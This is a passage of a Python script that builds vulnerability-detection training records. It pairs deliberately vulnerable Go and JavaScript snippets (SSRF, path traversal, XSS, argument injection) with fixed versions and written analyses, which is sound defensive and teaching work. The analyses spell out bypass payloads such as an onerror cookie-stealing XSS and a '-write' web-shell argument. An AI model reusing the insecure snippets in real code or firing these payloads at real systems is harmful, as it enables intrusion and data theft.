    "fix_suggestion": "no fix needed",
}, {"kind": "blacklist_bypass_safe", "pair": "BB8", "cwe": "CWE-78"}))

# ============================================================
# BB9 go CWE-918：SSRF 字符串黑名单 vs 解析后 IP 段校验
# ============================================================
BB9_V = '''package avatar

import (
	"errors"
	"io"
	"net/http"
	"strings"
)

var errBlocked = errors.New("blocked address")

var blockedWords = []string{"127.0.0.1", "localhost", "169.254", "10.", "192.168."}

func FetchAvatar(client *http.Client, url string) ([]byte, error) {
	for _, w := range blockedWords {
		if strings.Contains(url, w) {
			return nil, errBlocked
		}
	}
	resp, err := client.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}'''
BB9_S = '''package avatar

import (
	"context"
	"errors"
	"io"
	"net"
	"net/http"
	"net/url"
)

var errBlocked = errors.New("blocked address")

func FetchAvatar(client *http.Client, rawURL string) ([]byte, error) {
	u, err := url.Parse(rawURL)
	if err != nil {
		return nil, err
	}
	if u.Scheme != "https" {
		return nil, errBlocked
	}
	dial := func(ctx context.Context, network, addr string) (net.Conn, error) {
		host, port, _ := net.SplitHostPort(addr)
		ips, err := net.DefaultResolver.LookupIP(ctx, "ip", host)
		if err != nil {
			return nil, err
		}
		for _, ip := range ips {
			if ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() {
				return nil, errBlocked
			}
		}
		var d net.Dialer
		return d.DialContext(ctx, network, net.JoinHostPort(ips[0].String(), port))
	}
	tr := &http.Transport{DialContext: dial}
	resp, err := tr.RoundTrip(&http.Request{Method: "GET", URL: u})
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}'''

records.append(make_record(BB9_V, "go", f"""分析过程：
1. 第 {ln(BB9_V, 'func FetchAvatar')} 行：FetchAvatar 是头像拉取工具函数，url 参数承载外部提供的头像地址——污点边界=函数参数。
2. 第 {ln(BB9_V, 'blockedWords')}→{ln(BB9_V, 'client.Get')} 行：url 经字符串黑名单后由 http.Client 直接发起请求。
3. 第 {ln(BB9_V, 'blockedWords')} 行防御核验：黑名单匹配的是 URL 字符串字形而非目标地址——`0x7f000001`、`2130706433`、`0.0.0.0`、`[::1]` 都是 127.0.0.1 的合法书写形式且不命中任何黑名单词；域名解析到内网 IP（rebinding）同样绕过。服务端将对内网端点发起请求。
4. 第二入口/替代通道：重定向跟随（Client 默认跟随 30x）会把请求引向黑名单未覆盖的第二地址。
5. 结论：CWE-918 Server-Side Request Forgery，High。""", {
    "has_vulnerability": True,
    "vulnerability_type": "CWE-918 Server-Side Request Forgery",
    "risk_level": "High",
    "source": f"line {ln(BB9_V, 'func FetchAvatar')}: url 参数（外部头像地址）",
    "sink": f"line {ln(BB9_V, 'client.Get')}: client.Get 服务端发起任意请求",
    "explanation": "url -> 字符串黑名单(0x7f000001/0.0.0.0/[::1]/rebinding 绕过) -> 服务端请求内网地址",
    "fix_suggestion": f"line {ln(BB9_S, 'dial := func')}: 解析后按 IP 段校验（白名单 scheme + Dial 层拦截私网/回环）",
}, {"kind": "blacklist_bypass_vuln", "pair": "BB9", "cwe": "CWE-918"}))

records.append(make_record(BB9_S, "go", f"""分析过程：
1. 第 {ln(BB9_S, 'func FetchAvatar')} 行：rawURL 参数即污点边界——外部头像地址按不可信处理。
2. 第 {ln(BB9_S, 'u.Scheme')}→{ln(BB9_S, 'tr.RoundTrip')} 行：先做 scheme 白名单，再在自定义 Dial 层对解析出的全部 IP 做段校验，通过后才建立连接。
3. 第 {ln(BB9_S, 'u.Scheme')}-{ln(BB9_S, 'ip.IsLoopback')} 行防御核验：校验对象是解析后的 IP 对象而非字符串——0x7f000001、2130706433、[::1] 等一切书写形态在 LookupIP 归一为 IP 后统一判定回环/私网/链路本地；校验点位于实际建连的 DialContext 内，DNS rebinding 无法在解析与连接之间制造差异；https scheme 白名单同时封死 file/gopher 等其他协议。类型正确（判定地址而非字形）、位置在建连点、覆盖全部输入域。
4. 第二入口/替代通道：RoundTrip 不跟随重定向（无 Client 自动跳转），如需跟随可在 CheckRedirect 复用同一校验。
5. 结论：无漏洞。""", {
    "has_vulnerability": False,
    "vulnerability_type": "none",
    "risk_level": "None",
    "source": "N/A",
    "sink": "N/A",
    "explanation": "rawURL -> scheme 白名单 + Dial 层 IP 段校验 -> 书写形态已归一、rebinding 无窗口 -> 无法触达内网",
    "fix_suggestion": "no fix needed",
}, {"kind": "blacklist_bypass_safe", "pair": "BB9", "cwe": "CWE-918"}))

# ============================================================
# BB10 go CWE-22：单遍删除重组 vs Clean+前缀校验
# ============================================================
BB10_V = '''package tpl

import (
	"os"
	"path/filepath"
	"strings"
)

const templateDir = "/srv/templates"

func ReadTemplate(name string) (string, error) {
	cleaned := strings.ReplaceAll(name, "../", "")
	path := filepath.Join(templateDir, cleaned)
	data, err := os.ReadFile(path)
	if err != nil {
		return "", err
	}
	return string(data), nil
}'''
BB10_S = '''package tpl

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
)

const templateDir = "/srv/templates"

var errEscape = errors.New("path escape")

func ReadTemplate(name string) (string, error) {
	path := filepath.Clean(filepath.Join(templateDir, name))
	if !strings.HasPrefix(path, templateDir+string(os.PathSeparator)) {
		return "", errEscape
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return "", err
	}
	return string(data), nil
}'''

records.append(make_record(BB10_V, "go", f"""分析过程：
1. 第 {ln(BB10_V, 'func ReadTemplate')} 行：ReadTemplate 是模板服务调用的工具函数，name 参数承载外部提交的模板名——污点边界=函数参数。
2. 第 {ln(BB10_V, 'cleaned :=')}→{ln(BB10_V, 'os.ReadFile')} 行：name 经 ReplaceAll 删除 "../" 后与基目录 Join，直接读文件。
3. 第 {ln(BB10_V, 'cleaned :=')} 行防御核验：ReplaceAll 是单遍扫描——name = `....//....//etc/passwd` 删除每个 "....//" 中间的 "../" 后剩余 "../"，双层穿越段原样保留；filepath.Join 的 Clean 只会如实地把 "../" 折叠为向上层跳转，无法识别这是被过滤后的残余。删除式过滤可被自嵌入输入重组绕过。
4. 第二入口/替代通道：os.ReadFile 是唯一 sink；符号链接需要文件系统侧配合，此处穿越已足够逃逸。
5. 结论：CWE-22 Path Traversal，High。""", {
    "has_vulnerability": True,
    "vulnerability_type": "CWE-22 Path Traversal",
    "risk_level": "High",
    "source": f"line {ln(BB10_V, 'func ReadTemplate')}: name 参数（外部模板名）",
    "sink": f"line {ln(BB10_V, 'os.ReadFile')}: os.ReadFile 读取逃逸路径",
    "explanation": "name -> ReplaceAll 单遍删除(....// 重组为 ../) -> Join 折叠穿越 -> 读取基目录外文件",
    "fix_suggestion": f"line {ln(BB10_S, 'filepath.Clean')}: Join+Clean 规范化后做基目录前缀校验",
}, {"kind": "blacklist_bypass_vuln", "pair": "BB10", "cwe": "CWE-22"}))

records.append(make_record(BB10_S, "go", f"""分析过程：
1. 第 {ln(BB10_S, 'func ReadTemplate')} 行：name 参数即污点边界——外部模板名按不可信处理。
2. 第 {ln(BB10_S, 'filepath.Clean')}→{ln(BB10_S, 'os.ReadFile')} 行：name 先 Join 进基目录再 Clean 得到规范路径，通过前缀校验后才读文件。
3. 第 {ln(BB10_S, 'filepath.Clean')}-{ln(BB10_S, 'strings.HasPrefix')} 行防御核验：校验发生在路径规范化之后——任意数量、任意嵌套与混合斜杠形式的穿越段都在 Clean 阶段折叠为最终绝对路径，逃逸路径必然不满足 `templateDir + /` 前缀；以路径分隔符结尾的前缀排除了 /srv/templates-evil 同前缀目录混淆。类型正确（校验解析结果而非输入字形）、位置在读取前、覆盖全部输入域。
4. 第二入口/替代通道：os.ReadFile 是唯一 sink 且被同一校验保护。
5. 结论：无漏洞。""", {
    "has_vulnerability": False,
    "vulnerability_type": "none",
    "risk_level": "None",
    "source": "N/A",
    "sink": "N/A",
    "explanation": "name -> Join+Clean 规范化 -> 基目录前缀校验 -> 穿越段折叠后被拦截",
    "fix_suggestion": "no fix needed",
}, {"kind": "blacklist_bypass_safe", "pair": "BB10", "cwe": "CWE-22"}))

# ============================================================
# BB11 js CWE-79：split/join 删除标签 vs 全量实体转义
# ============================================================
BB11_V = '''// render-comment.js —— 评论渲染工具（被评论服务调用）
function renderComment(comment) {
  let clean = comment.split("<script>").join("");
  clean = clean.split("</script>").join("");
  return '<div class="comment">' + clean + "</div>";
}

module.exports = { renderComment };'''
BB11_S = '''// render-comment.js —— 评论渲染工具（被评论服务调用）
const ESCAPE = { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" };

function renderComment(comment) {
  const clean = String(comment).replace(/[&<>"']/g, (c) => ESCAPE[c]);
  return '<div class="comment">' + clean + "</div>";
}

module.exports = { renderComment };'''

records.append(make_record(BB11_V, "javascript", f"""分析过程：
1. 第 {ln(BB11_V, 'function renderComment')} 行：renderComment 是评论服务调用的渲染函数，comment 参数承载外部同步的评论文本——污点边界=函数参数。
2. 第 {ln(BB11_V, 'let clean')}→{ln(BB11_V, 'return')} 行：comment 删除 script 标签后拼进 HTML 返回给上层渲染。
3. 第 {ln(BB11_V, 'let clean')} 行防御核验：按确切字形删除两种标签——(a) `<img src=x onerror=alert(document.cookie)>` 不含 script 标签，事件处理器直接执行；(b) 嵌套输入 `<scr<script>ipt>alert(1)</scr</script>ipt>` 删除内层标签后重组出完整 `<script>`。删除字形不改变 HTML 解析语义。
4. 第二入口/替代通道：返回值进入上层 HTML body 渲染是唯一输出上下文。
5. 结论：CWE-79 Cross-Site Scripting，High。""", {
    "has_vulnerability": True,
    "vulnerability_type": "CWE-79 Cross-Site Scripting",
    "risk_level": "High",
    "source": f"line {ln(BB11_V, 'function renderComment')}: comment 参数（外部评论文本）",
    "sink": f"line {ln(BB11_V, 'return')}: 拼接进 HTML 输出",
    "explanation": "comment -> 删除 script 标签(事件处理器/嵌套重组绕过) -> 拼进 HTML",
    "fix_suggestion": f"line {ln(BB11_S, 'const clean')}: 五语法字符全量实体转义",
}, {"kind": "blacklist_bypass_vuln", "pair": "BB11", "cwe": "CWE-79"}))

records.append(make_record(BB11_S, "javascript", f"""分析过程：
1. 第 {ln(BB11_S, 'function renderComment')} 行：comment 参数即污点边界——外部评论文本按不可信处理。
2. 第 {ln(BB11_S, 'const clean')}→{ln(BB11_S, 'return')} 行：comment 经正则把 & < > " ' 五类字符替换为 HTML 实体后拼进输出。
3. 第 {ln(BB11_S, 'const ESCAPE')}-{ln(BB11_S, 'const clean')} 行防御核验：转义覆盖全部 HTML 语法边界字符——& 防实体注入、< > 防标签构造、" ' 防属性逃逸；任何输入经转义后都不再包含可被浏览器解释为结构边界的字符，事件处理器与嵌套重组都失去前提。String() 归一非字符串输入防止 toString 侧信道。类型正确（实体化匹配 HTML body 上下文）、位置在输出点、覆盖全部输入域。
4. 第二入口/替代通道：单一 return 输出点；无其他渲染路径。
5. 结论：无漏洞。""", {
    "has_vulnerability": False,
    "vulnerability_type": "none",
    "risk_level": "None",
    "source": "N/A",
    "sink": "N/A",
    "explanation": "comment -> 五语法字符实体转义 -> 无标签/属性边界可构造 -> HTML body 安全输出",
    "fix_suggestion": "no fix needed",
}, {"kind": "blacklist_bypass_safe", "pair": "BB11", "cwe": "CWE-79"}))

# ============================================================
# BB12 js CWE-78：shell 元字符过滤不防参数注入 vs execFile
# ============================================================
BB12_V = '''const { exec } = require("child_process");

// 图片处理工具：上传服务把用户文件名传入
function convertImage(src) {
  if (/[;&|`$]/.test(src)) {
    throw new Error("illegal filename");
  }
  exec("convert " + src + " /var/www/out/thumb.png", (err) => {
    if (err) console.error("convert failed:", err.message);
  });
}

module.exports = { convertImage };'''
BB12_S = '''const { execFile } = require("child_process");

// 图片处理工具：上传服务把用户文件名传入
function convertImage(src) {
  execFile("convert", [src, "/var/www/out/thumb.png"], (err) => {
    if (err) console.error("convert failed:", err.message);
  });
}

module.exports = { convertImage };'''

records.append(make_record(BB12_V, "javascript", f"""分析过程：
1. 第 {ln(BB12_V, 'function convertImage')} 行：convertImage 是上传服务调用的工具函数，src 参数承载用户文件名——污点边界=函数参数。
2. 第 {ln(BB12_V, 'if (/[;&|`$]/')}→{ln(BB12_V, 'exec(')} 行：src 经元字符过滤后拼进命令串，exec 交给 /bin/sh 执行。
3. 第 {ln(BB12_V, 'if (/[;&|`$]/')} 行防御核验：正则只拦 shell 语法字符，拦不住参数注入——src = `x.png -write /var/www/shell.php` 不含任何被禁字符，但 convert 把 -write 解析为自己的选项，把处理结果写到攻击者指定路径。消除 shell 元字符≠消除注入：目标程序自身的选项解析层完全暴露。
4. 第二入口/替代通道：exec 的 shell 解析层是并列通道（换行符同样不在过滤集内）。
5. 结论：CWE-78 OS Command Injection，Critical。""", {
    "has_vulnerability": True,
    "vulnerability_type": "CWE-78 OS Command Injection",
    "risk_level": "Critical",
    "source": f"line {ln(BB12_V, 'function convertImage')}: src 参数（用户文件名）",
    "sink": f"line {ln(BB12_V, 'exec(')}: exec 经 shell 执行、convert 解析注入选项",
    "explanation": "src -> 元字符过滤(不防参数注入) -> 拼接命令 -> convert -write 写任意文件",
    "fix_suggestion": f"line {ln(BB12_S, 'execFile(')}: execFile 参数数组，src 恒为位置参数",
}, {"kind": "blacklist_bypass_vuln", "pair": "BB12", "cwe": "CWE-78"}))

records.append(make_record(BB12_S, "javascript", f"""分析过程：
1. 第 {ln(BB12_S, 'function convertImage')} 行：src 参数即污点边界——用户文件名按不可信处理。
2. 第 {ln(BB12_S, 'execFile(')} 行：convert 为固定程序名，src 与输出路径各占一个独立数组元素，execFile 直接 spawn。
3. 第 {ln(BB12_S, 'execFile(')} 行防御核验：execFile 不经 shell——数组元素逐个作为 argv 传递，src 无论以 "-" 开头还是包含空格、分号，都只是第一个位置参数的字面内容，convert 的选项解析永远不会把用户输入当作选项；命令结构（程序名 + 两个参数）在调用点固定。类型正确（消除 shell 与选项两层注入面）、位置在执行点、覆盖全部输入域。
4. 第二入口/替代通道：无 shell 层；输出路径是硬编码常量。
5. 结论：无漏洞。""", {
    "has_vulnerability": False,
    "vulnerability_type": "none",
    "risk_level": "None",
    "source": "N/A",
    "sink": "N/A",
    "explanation": "src -> execFile argv 数组 -> 用户输入恒为位置参数字面量 -> 无 shell/选项注入面",
    "fix_suggestion": "no fix needed",
}, {"kind": "blacklist_bypass_safe", "pair": "BB12", "cwe": "CWE-78"}))


# ============================================================
# 自检（与构建脚本断言门同口径）+ 写出
# ============================================================
def self_check():
    problems = []
    for idx, r in enumerate(records):
        msgs = r["messages"]
        if [m["role"] for m in msgs] != ["system", "user", "assistant"]:
            problems.append(f"#{idx} 结构错误")
            continue
        user_c, asst_c = msgs[1]["content"], msgs[2]["content"]
        m = re.search(r"```json\s*(\{.*?\})\s*```", asst_c, re.S)
        if not m:
            problems.append(f"#{idx} 无 json")
            continue
        obj = json.loads(m.group(1))
        cm = re.search(r"```[\w+-]*\n(.*?)\n```", user_c, re.S)
        code_body = cm.group(1) if cm else user_c
        n_lines = code_body.count("\n") + 1
        hv = obj["has_vulnerability"]
        if hv and not obj["vulnerability_type"].startswith("CWE-"):
            problems.append(f"#{idx} vuln 类型非 CWE")
        if not hv and obj["vulnerability_type"] != "none":
            problems.append(f"#{idx} safe 类型非 none")
        for ln_ in {int(n) for n in re.findall(r"line (\d+)", json.dumps(obj))}:
            if not (1 <= ln_ <= n_lines):
                problems.append(f"#{idx} 行号越界 line {ln_} > {n_lines}")
        # JSON 值内禁双引号（构建侧一致性约定）
        for v in obj.values():
            if isinstance(v, str) and '"' in v:
                problems.append(f"#{idx} JSON 值含双引号")
    return problems


if __name__ == "__main__":
    bad = self_check()
    if bad:
        print("自检失败：")
        for p in bad:
            print(" -", p)
        sys.exit(1)
    OUT.write_text("\n".join(json.dumps(r, ensure_ascii=False) for r in records) + "\n",
                   encoding="utf-8")
    n_v = sum(1 for r in records if r["meta"]["kind"].endswith("vuln"))
    print(f"自检通过：{len(records)} 条（vuln {n_v} / safe {len(records)-n_v}），12 对")
    print(f"输出: {OUT}")
